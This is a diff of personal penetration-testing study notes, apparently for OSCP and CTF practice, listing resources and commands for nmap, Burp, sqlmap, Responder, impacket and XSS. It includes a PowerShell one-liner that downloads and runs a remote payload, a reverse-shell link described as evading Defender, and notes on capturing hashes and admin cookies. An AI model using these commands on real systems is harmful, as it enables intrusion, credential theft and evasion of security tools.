@@ -21,8 +21,14 @@ RESOURCES
 	https://hausec.com/pentesting-cheatsheet/
 	https://www.hackingtutorials.org/scanning-tutorials/scanning-for-smb-vulnerabilities-using-nmap/
 	https://www.tutorialspoint.com/metasploit/metasploit_quick_guide.htm
-
+	https://ss64.com/
 	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
+	http://pentestmonkey.net/
+	https://github.com/SecWiki/windows-kernel-exploits
+
+https://github.com/740i/pentest-notes
+https://sushant747.gitbooks.io/total-oscp-guide/content/
+https://yunaranyancat.github.io/musubi/others/oscpreview
 
 LEARNING
 	https://academy.hackthebox.eu/dashboard
@@ -36,6 +42,9 @@ LEARNING
 	https://www.udemy.com/course/windows-privilege-escalation-for-beginners/
 	https://www.vulnhub.com/
 	https://www.offensive-security.com/labs/individual/
+	https://github.com/740i/pentest-notes
+	https://sushant747.gitbooks.io/total-oscp-guide/content/
+	https://yunaranyancat.github.io/musubi/others/oscpreview
 
 tactics
 	using burp suite to repeat an http request to get a backup shell
@@ -61,6 +70,21 @@ articles
 CTFs
 	https://ctftime.org
 	https://www.majorleaguecyber.org/
+	https://0x0539.net/
+	https://www.ctf.live
+
+POWERSHELL
+	locations
+		C:\Windows\System32\WindowsPowerShell\
+		C:\Users\<USERNAME>\Documents\WindowsPowerShell\
+		profiles live in here
+		looks like you can use a profile to have powershell run commands on startup
+		i think we can completely break powershell this way
+		maybe we can stick a user in a PSDrive without anything in it
+	setting execution policy can be done through registry
+	https://ss64.com/ps/
+	can use [IPAddress] to typecast something to an IP Address type
+		there a bunch more of these types of objects that powershell has, like email
 
 ------------------------------------------------------------------------------------------------------
 TOOLS
@@ -69,7 +93,13 @@ TOOLS
 NMAP
 	nmap -sC -sV -oA nmap/<hostname> <target ip address>
 	nmap -sV -vv --script vuln TARGET_IP
-	-p- does all ports
+	-p- does all ports, -p <X> for X port
+	-Pn disables host discovery and scans anyways
+	-A os/version detection, some script enumeration
+	-v verbose
+	-sU UDP port scan
+	-sS TCP SYN port scan
+	https://github.com/21y4d/nmapAutomator
 
 WIRESHARK
 	https://wiki.wireshark.org/DisplayFilters
@@ -123,6 +153,7 @@ RDP
 
 METASPLOIT
 	post/multi/recon/local_exploit_suggester
+	exploit/multi/handler
 
 MSFVENOM
 	generate payload file in multiple different formats to interact with metasploit
@@ -147,29 +178,51 @@ SMB COMMANDS
 	sudo mount -t cifs //<IP ADDRESS>/<SHARE NAME> /mnt/smb
 		mount smb share
 
-SQL cmd line
-	select * from session_privs;
-	select * from user_role_privs;
-
 HTTP server
 	python -m SimpleHTTPServer 80
 		starts an http server in the current directory
 	IEX(New-Object Net.WebClient).DownloadString("http://<IP>:<PORT>/<PAYLOAD>") | powershell -noprofile -
 
-OPENVPN
-	sudo openvpn /path/to/file.ovpn
+RESPONDER
+	start by just typing responder
+	this attempts to capture the hash of a user that tried to auth to the attack box
+		one example is trying to get an sql server to exec a dirtree command on a folder on the attack box
 
-FLAGS
-	dir /b/s *.txt
-		finds all text files in a dir tree
+SEARCHSPLOIT
+	searches for exploits
+	usage: searchsploit <KEYPHRASE>
+
+IMPACKET
+	impacket-smbserver
+		impacket-smbserver files `pwd`
+			sets up an smb server on the attack box with a share named files in the pwd
+
+BLOODHOUND
+
+NEO4J
+
+REVERSE SHELL
+	https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
+		this needs to be compiled
+		defender should have issues detecting this
+		need to change host ip and port in the TcpClient part
+
+LINPEAS
+	linux enumeration tool
 
 ------------------------------------------------------------------------------------------------------
 WEB
 ------------------------------------------------------------------------------------------------------
 
+https://sechow.com/bricks/
+
 GOBUSTER/DIRBUSTER
 	gobuster dir -u <TARGET URL> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ./gobuster_out.txt
 	/usr/share/dirbuster/wordlists
+	-e print full URLs in console
+	-U and -P for basic auth
+	-p <X> proxy utilization
+	-c <HTTP COOKIES> use cookie
 
 BURP
 	https://www.youtube.com/watch?v=G3hpAeoZ4ek
@@ -193,8 +246,76 @@ BURP
 		compare by words highlights words that are different
 	decoder tab
 		encodes and decodes between different formats
+	if looking for flags in HTML or GET requests
+		use burp, go to the pages, and then go to HTTP history in the proxy menu
+		much easier to search through each page this way for flags
+	can use a sniper attack for the intruder when trying to figure out what files can be uploaded
+		get burp to intercept a request to upload the file, and then send that request to intruder
+		then set a wordlist in the payload options to the extensions to try
+		also ensure you set the ip and ports correctly for the attack
 
 XSS
 	https://youtu.be/HbzI3ubOos0
 	sublime on kali
 	payload all the things
+	start by entering html tags, see what happens
+		<h1></h1>, <code></code>, <script>alert(1)</script>
+	DOMPurify - does sanitization
+	python - import requests for interacting with websites
+	capture admin cookie usually
+
+SQL
+	sqlmap
+		does sql injection
+		get a request to an sql injectable location on a website and send it to burp's repeater
+		put a * where you can do sql injection
+		save that request as a .req file
+		do sqlmap -r <FILENAME>.req
+		can take a while so do other things while its running
+	http://pentestmonkey.net/category/cheat-sheet/sql-injection
+		this also has a php reverse shell
+		can also just google sql injection with backend database
+	/usr/share/wordlists/wfuzz/Injections
+		I guess wfuzz can also do sql injections
+
+SQL cmd line
+	select * from session_privs;
+	select * from user_role_privs;
+
+NIKTO
+	nikto -h "<URL>"
+		can also | tee nikto.log
+
+------------------------------------------------------------------------------------------------------
+MISC
+------------------------------------------------------------------------------------------------------
+
+READ
+	https://github.com/740i/pentest-notes
+	https://yunaranyancat.github.io/musubi/others/oscpreview
+	https://sushant747.gitbooks.io/total-oscp-guide/content/
+	https://www.youtube.com/channel/UCcU4a3acOkH43EjNfpprIEw/videos
+	https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#gid=1839402159
+	https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+KEX
+	https://www.kali.org/docs/wsl/win-kex/
+	vncserver
+	kex start (might not need to do this)
+	kex --esm
+
+OPENVPN
+	sudo openvpn /path/to/file.ovpn
+
+FLAGS
+	dir /b/s *.txt
+		finds all text files in a dir tree
+
+OSCP info
+	https://youtu.be/MQGozZzHUwQ
+	https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
+	https://github.com/740i/pentest-notes
+	https://sushant747.gitbooks.io/total-oscp-guide/content/
+	https://yunaranyancat.github.io/musubi/others/oscpreview
+	https://www.youtube.com/channel/UCcU4a3acOkH43EjNfpprIEw/videos
+	https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#gid=1839402159
